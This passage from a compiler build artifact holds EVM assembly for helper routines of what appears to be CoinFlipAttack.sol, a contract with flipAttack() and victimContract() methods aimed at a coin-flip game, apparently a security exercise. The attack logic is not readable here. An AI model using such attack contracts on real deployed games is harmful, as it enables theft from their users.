											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 288,
											"end": 341,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 275,
											"end": 341,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 275,
											"end": 341,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 205,
											"end": 347,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 205,
											"end": 347,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 205,
											"end": 347,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 205,
											"end": 347,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 353,
											"end": 479,
											"name": "tag",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 353,
											"end": 479,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 403,
											"end": 412,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 436,
											"end": 473,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 467,
											"end": 472,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 436,
											"end": 473,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 436,
											"end": 473,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 436,
											"end": 473,
											"name": "tag",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 436,
											"end": 473,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 423,
											"end": 473,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 423,
											"end": 473,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 353,
											"end": 479,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 353,
											"end": 479,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 353,
											"end": 479,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 353,
											"end": 479,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 485,
											"end": 626,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 485,
											"end": 626,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 550,
											"end": 559,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 583,
											"end": 620,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 614,
											"end": 619,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 583,
											"end": 620,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 583,
											"end": 620,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 583,
											"end": 620,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 583,
											"end": 620,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 570,
											"end": 620,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 570,
											"end": 620,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 485,
											"end": 626,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 485,
											"end": 626,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 485,
											"end": 626,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 485,
											"end": 626,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 632,
											"end": 793,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 632,
											"end": 793,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 734,
											"end": 786,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 780,
											"end": 785,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 734,
											"end": 786,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 734,
											"end": 786,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 734,
											"end": 786,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 734,
											"end": 786,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 729,
											"end": 732,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 722,
											"end": 787,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 632,
											"end": 793,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 632,
											"end": 793,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 632,
											"end": 793,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 799,
											"end": 1051,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 799,
											"end": 1051,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 907,
											"end": 911,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 945,
											"end": 947,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 934,
											"end": 943,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 930,
											"end": 948,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 922,
											"end": 948,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 922,
											"end": 948,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 958,
											"end": 1044,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1041,
											"end": 1042,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1030,
											"end": 1039,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1026,
											"end": 1043,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1017,
											"end": 1023,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 958,
											"end": 1044,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 958,
											"end": 1044,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 958,
											"end": 1044,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 958,
											"end": 1044,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 799,
											"end": 1051,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 799,
											"end": 1051,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 799,
											"end": 1051,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 799,
											"end": 1051,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 799,
											"end": 1051,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1057,
											"end": 1134,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1057,
											"end": 1134,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1094,
											"end": 1101,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1123,
											"end": 1128,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1112,
											"end": 1128,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1112,
											"end": 1128,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1057,
											"end": 1134,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1057,
											"end": 1134,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1057,
											"end": 1134,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1057,
											"end": 1134,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1140,
											"end": 1320,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 1140,
											"end": 1320,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1188,
											"end": 1265,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1185,
											"end": 1186,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1178,
											"end": 1266,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1285,
											"end": 1289,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 1282,
											"end": 1283,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 1275,
											"end": 1290,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1309,
											"end": 1313,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1306,
											"end": 1307,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1299,
											"end": 1314,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1326,
											"end": 1520,
											"name": "tag",
											"source": 2,
											"value": "13"
										},
										{
											"begin": 1326,
											"end": 1520,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1366,
											"end": 1370,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1386,
											"end": 1406,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1404,
											"end": 1405,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1386,
											"end": 1406,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1386,
											"end": 1406,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1386,
											"end": 1406,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1386,
											"end": 1406,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1381,
											"end": 1406,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1381,
											"end": 1406,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1420,
											"end": 1440,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1438,
											"end": 1439,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1420,
											"end": 1440,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1420,
											"end": 1440,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1420,
											"end": 1440,
											"name": "tag",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1420,
											"end": 1440,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1415,
											"end": 1440,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1415,
											"end": 1440,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1464,
											"end": 1465,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1461,
											"end": 1462,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1457,
											"end": 1466,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1449,
											"end": 1466,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1449,
											"end": 1466,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1488,
											"end": 1489,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1482,
											"end": 1486,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1479,
											"end": 1490,
											"name": "GT",
											"source": 2
										},
										{
											"begin": 1476,
											"end": 1513,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1476,
											"end": 1513,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1476,
											"end": 1513,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1493,
											"end": 1511,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 1493,
											"end": 1511,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 1493,
											"end": 1511,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1493,
											"end": 1511,
											"name": "tag",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 1493,
											"end": 1511,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1476,
											"end": 1513,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1476,
											"end": 1513,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1326,
											"end": 1520,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1326,
											"end": 1520,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1326,
											"end": 1520,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1326,
											"end": 1520,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1326,
											"end": 1520,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1526,
											"end": 1706,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 1526,
											"end": 1706,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1574,
											"end": 1651,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1571,
											"end": 1572,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1564,
											"end": 1652,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1671,
											"end": 1675,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 1668,
											"end": 1669,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 1661,
											"end": 1676,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1695,
											"end": 1699,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1692,
											"end": 1693,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1685,
											"end": 1700,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1897,
											"name": "tag",
											"source": 2,
											"value": "15"
										},
										{
											"begin": 1712,
											"end": 1897,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1752,
											"end": 1753,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1769,
											"end": 1789,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1787,
											"end": 1788,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1769,
											"end": 1789,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1769,
											"end": 1789,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1769,
											"end": 1789,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1769,
											"end": 1789,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1764,
											"end": 1789,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1764,
											"end": 1789,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1803,
											"end": 1823,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 1821,
											"end": 1822,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1803,
											"end": 1823,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 1803,
											"end": 1823,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1803,
											"end": 1823,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 1803,
											"end": 1823,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1798,
											"end": 1823,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1798,
											"end": 1823,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1842,
											"end": 1843,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1832,
											"end": 1867,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 1832,
											"end": 1867,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1847,
											"end": 1865,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "67"
										},
										{
											"begin": 1847,
											"end": 1865,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 1847,
											"end": 1865,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1847,
											"end": 1865,
											"name": "tag",
											"source": 2,
											"value": "67"
										},
										{
											"begin": 1847,
											"end": 1865,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1832,
											"end": 1867,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 1832,
											"end": 1867,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1889,
											"end": 1890,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1886,
											"end": 1887,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1882,
											"end": 1891,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 1877,
											"end": 1891,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1877,
											"end": 1891,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1897,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1897,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1897,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1897,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1712,
											"end": 1897,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1903,
											"end": 1993,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 1903,
											"end": 1993,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1937,
											"end": 1944,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1980,
											"end": 1985,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1973,
											"end": 1986,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1966,
											"end": 1987,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1955,
											"end": 1987,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1955,
											"end": 1987,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1903,
											"end": 1993,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1903,
											"end": 1993,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1903,
											"end": 1993,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1903,
											"end": 1993,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1999,
											"end": 2108,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1999,
											"end": 2108,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2080,
											"end": 2101,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2095,
											"end": 2100,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2080,
											"end": 2101,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 2080,
											"end": 2101,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2080,
											"end": 2101,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 2080,
											"end": 2101,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2075,
											"end": 2078,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2068,
											"end": 2102,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1999,
											"end": 2108,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1999,
											"end": 2108,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1999,
											"end": 2108,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2114,
											"end": 2324,
											"name": "tag",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 2114,
											"end": 2324,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2201,
											"end": 2205,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2239,
											"end": 2241,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2228,
											"end": 2237,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2224,
											"end": 2242,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2242,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2242,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2252,
											"end": 2317,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2314,
											"end": 2315,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2303,
											"end": 2312,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2299,
											"end": 2316,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2290,
											"end": 2296,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2252,
											"end": 2317,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 2252,
											"end": 2317,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2252,
											"end": 2317,
											"name": "tag",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 2252,
											"end": 2317,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2114,
											"end": 2324,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2114,
											"end": 2324,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2114,
											"end": 2324,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2114,
											"end": 2324,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2114,
											"end": 2324,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2411,
											"end": 2528,
											"name": "tag",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 2411,
											"end": 2528,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2520,
											"end": 2521,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2517,
											"end": 2518,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2510,
											"end": 2522,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2657,
											"end": 2773,
											"name": "tag",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 2657,
											"end": 2773,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2748,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "77"
										},
										{
											"begin": 2742,
											"end": 2747,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2748,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 2727,
											"end": 2748,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2748,
											"name": "tag",
											"source": 2,
											"value": "77"
										},
										{
											"begin": 2727,
											"end": 2748,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2720,
											"end": 2725,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2717,
											"end": 2749,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2707,
											"end": 2767,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 2707,
											"end": 2767,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2763,
											"end": 2764,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2760,
											"end": 2761,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2753,
											"end": 2765,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2707,
											"end": 2767,
											"name": "tag",
											"source": 2,
											"value": "78"
										},
										{
											"begin": 2707,
											"end": 2767,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2657,
											"end": 2773,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2657,
											"end": 2773,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2779,
											"end": 2916,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 2779,
											"end": 2916,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2833,
											"end": 2838,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2864,
											"end": 2870,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2858,
											"end": 2871,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 2849,
											"end": 2871,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2849,
											"end": 2871,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2880,
											"end": 2910,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 2904,
											"end": 2909,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2880,
											"end": 2910,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 2880,
											"end": 2910,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2880,
											"end": 2910,
											"name": "tag",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 2880,
											"end": 2910,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2779,
											"end": 2916,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2779,
											"end": 2916,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2779,
											"end": 2916,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2779,
											"end": 2916,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2779,
											"end": 2916,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 3267,
											"name": "tag",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 2922,
											"end": 3267,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2989,
											"end": 2995,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3038,
											"end": 3040,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3026,
											"end": 3035,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3017,
											"end": 3024,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3013,
											"end": 3036,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3009,
											"end": 3041,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 3006,
											"end": 3125,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3006,
											"end": 3125,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "82"
										},
										{
											"begin": 3006,
											"end": 3125,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3044,
											"end": 3123,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "83"
										},
										{
											"begin": 3044,
											"end": 3123,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 3044,
											"end": 3123,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3044,
											"end": 3123,
											"name": "tag",
											"source": 2,
											"value": "83"
										},
										{
											"begin": 3044,
											"end": 3123,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3006,
											"end": 3125,
											"name": "tag",
											"source": 2,
											"value": "82"
										},
										{
											"begin": 3006,
											"end": 3125,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3164,
											"end": 3165,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3189,
											"end": 3250,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "84"
										},
										{
											"begin": 3242,
											"end": 3249,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3233,
											"end": 3239,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3222,
											"end": 3231,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 3218,
											"end": 3240,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3189,
											"end": 3250,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 3189,
											"end": 3250,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3189,
											"end": 3250,
											"name": "tag",
											"source": 2,
											"value": "84"
										},
										{
											"begin": 3189,
											"end": 3250,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3179,
											"end": 3250,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3179,
											"end": 3250,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3135,
											"end": 3260,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 3267,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 3267,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 3267,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 3267,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2922,
											"end": 3267,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"contracts/CoinFlip.sol",
								"contracts/CoinFlipAttack.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"flipAttack()": "987a4e26",
							"victimContract()": "f32d251d"
						}
					},
